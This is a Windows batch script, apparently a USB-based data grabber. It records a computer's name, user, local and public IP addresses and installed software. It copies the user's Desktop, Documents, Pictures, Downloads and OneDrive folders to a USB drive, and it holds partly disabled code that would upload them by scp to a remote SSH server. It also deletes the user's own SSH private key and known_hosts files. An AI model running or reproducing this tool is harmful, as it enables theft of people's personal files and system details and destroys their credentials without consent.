@echo off
setlocal enabledelayedexpansion

set /p usb_drive="Please enter the drive letter of your USB: "

:: Get machine name
set filename=%USERNAME%.txt
echo Machine Name: %COMPUTERNAME% > %filename%
:: Get logged in account name
echo Logged in Account Name: %USERNAME% >> %filename%
:: Get time and date
echo Time and Date: %TIME% %DATE% >> %filename%
:: Get local IP address
for /f "skip=1 tokens=2 delims=[]" %%a in ('ping %computername% -n 1 -4') do set localIP=%%a
echo Local IP: %localIP% >> %filename%
:: Get public IP address
for /f "skip=1 tokens=2 delims=[]" %%a in ('nslookup myip.opendns.com. resolver1.opendns.com') do set publicIP=%%a
echo Public IP: %publicIP% >> %filename%
:: Get list of installed apps
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | find "DisplayName" >> %filename%

:: uncomet lines with " " to activate the feature
:: copy the private key to the users .ssh folder
:: #deactivated xcopy /E /Y "%usb_drive%:\id_rsa" "%USERPROFILE%\.ssh\"
:: Set target server
:: #deactivated set target_server=[user]@[ip]
:: Set target server port defoult 22
:: #deactivated set target_port=22
:: set path to target folder
:: #deactivated set target_folder=Reaper-info-retreave/%USERNAME%/
:: Send information to SSH server
:: #deactivated ssh -p %target_port% %target_server% mkdir -p %target_folder%
:: #deactivated scp -P %target_port%  %filename% %target_server%:%target_folder%
:: #deactivated del %filename%

set desktop=%USERPROFILE%\Desktop
set documents=%USERPROFILE%\Documents
set images=%USERPROFILE%\Pictures
set downloads=%USERPROFILE%\Downloads
set onedrive=%USERPROFILE%\OneDrive

:: #deactivated set /p CopyFiles="Do you want to copy the files to the SSH server? (y/n): "
if /i "%CopyFiles%"=="y" (
    ssh -p %target_port% %target_server% mkdir -p %target_folder%Desktop
    scp -P %target_port% -r %desktop% %target_server%:%target_folder%Desktop
    ssh -p %target_port% %target_server% mkdir -p %target_folder%Documents
    scp -P %target_port% -r %documents% %target_server%:%target_folder%Documents
    ssh -p %target_port% %target_server% mkdir -p %target_folder%Images
    scp -P %target_port% -r %images% %target_server%:%target_folder%Images
    ssh -p %target_port% %target_server% mkdir -p %target_folder%Downloads
    scp -P %target_port% -r %downloads% %target_server%:%target_folder%/Downloads
    ssh -p %target_port% %target_server% mkdir -p %target_folder%OneDrive
    scp -P %target_port% -r %onedrive% %target_server%:%target_folder%OneDrive
    echo Files copied successfully!
) 
if /i "%CopyFiles%"=="n" (
    echo Copying files to USB only.
)

:: Delete the private key from the users .ssh folder        
del "%USERPROFILE%\.ssh\id_rsa"
del "%USERPROFILE%\.ssh\known_hosts"
del "%USERPROFILE%\.ssh\known_hosts.old"

set dest_folder="%usb_drive%:\%USERNAME%"

md "%dest_folder%"

xcopy /E /Y "%desktop%" "%dest_folder%\Desktop\"
xcopy /E /Y "%documents%" "%dest_folder%\Documents\"
xcopy /E /Y "%images%" "%dest_folder%\Images\"
xcopy /E /Y "%downloads%" "%dest_folder%\Downloads\"
xcopy /E /Y "%onedrive%" "%dest_folder%\OneDrive\"

echo Files copied successfully!

pause